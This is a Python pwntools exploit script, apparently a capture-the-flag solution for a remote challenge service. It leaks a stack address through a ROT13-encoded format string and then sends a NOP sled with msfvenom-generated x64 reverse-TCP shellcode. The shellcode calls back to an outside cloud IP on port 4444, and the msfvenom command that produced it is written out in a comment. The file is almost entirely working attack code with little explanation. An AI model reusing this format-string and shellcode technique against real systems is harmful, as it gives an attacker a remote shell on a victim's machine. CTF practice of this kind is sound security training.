from pwn import *
import codecs

## the address
def rot13(phrase):
    key = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    val = "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM"
    transform = dict(zip(key, val))
    return b''.join(transform.get(char,char).encode() for char in phrase.decode())

def byterot(bytestring):
		#bytereturn =b''
		byte_arr = []
		for byte in bytestring:
				if((byte >= 0x41 and byte <=0x4d) or (byte >= 0x61 and byte <= 0x6d)):
						byte += 13

				print (hex(byte))
				byte_arr += [byte]
		bytereturn = bytes(byte_arr)
		return bytereturn

conn = remote('pwnable.praetorian.com', 2888)

## this translates to %lx which will print out a quadword that, luckily for us, points directly at the beginning of the buffer that we control
stage1 ="%yk"

conn.recvuntil('remaining.\n')
conn.sendline(stage1)
conn.recvline()
addr_str = conn.recvline().decode()
addr_int = int('0x' +addr_str, 16) + 4
## put the 4 in case last character is null byte
print(hex(addr_int))

stage2_len = 272
nop=b'\x90'

## payload is generated with 
## msfvenom -p linux/x64/shell/reverse_tcp LHOST=3.12.61.126 LPORT=4444 -f python -b '\x00\x0d\x0a\x20'
## reverse shell to cloud box

buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\xe5\x17\x65\x57\xd6\xe9\x17"
buf += b"\xfe\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\xad\x26\x9a\x3d\xdf\xb1\x8e\x48\xf5\x5f\xec\x81\x9b"
buf += b"\xd8\xde\x94\xc7\x56\x3f\xe5\xd1\xe6\x12\xb6\x60\xd7"
buf += b"\x1d\x06\xbc\xe3\x56\xa7\xb5\x7d\x4c\x0f\x4f\x83\x15"
buf += b"\xa1\x8f\x16\x3b\x58\xd3\xa1\x92\x3e\x9d\x2c\x2d\xc0"
buf += b"\x9e\x50\x15\xfe\xf4\x4b\x66\x5b\xeb\x97\x46\xb6\x6c"
buf += b"\xf1\x0f\x47\x8c\x83\x3d\xa6\xea\x12\x3c\x1f\x53\x29"
buf += b"\x6e\xdb\xac\xe8\xac\x23\xce\xbe\x7d\xdd\xbd\x7d\x65"
buf += b"\x3d\xd3\xa1\x9e\x19\xad\x26\x93\x58\xd3\xb0\x4e\xa1"
buf += b"\xad\x92\xa5\x2e\x11\x83\x2b\xa6\x8f\x16\x3a\x58\xd3"
buf += b"\xb7\x7d\xd8\xbf\x18\x60\x1f\x53\x29\x6f\x13\x1a\xf1"
buf += b"\x65\x57\xd6\xe9\x17\xfe"

payload2= b"\x41" * 190

stage2 = buf + byterot(p64(addr_int)) + b'\x00'

stage2 = nop * (stage2_len - len(stage2)) + stage2

conn.sendline(stage2)
conn.recvall()
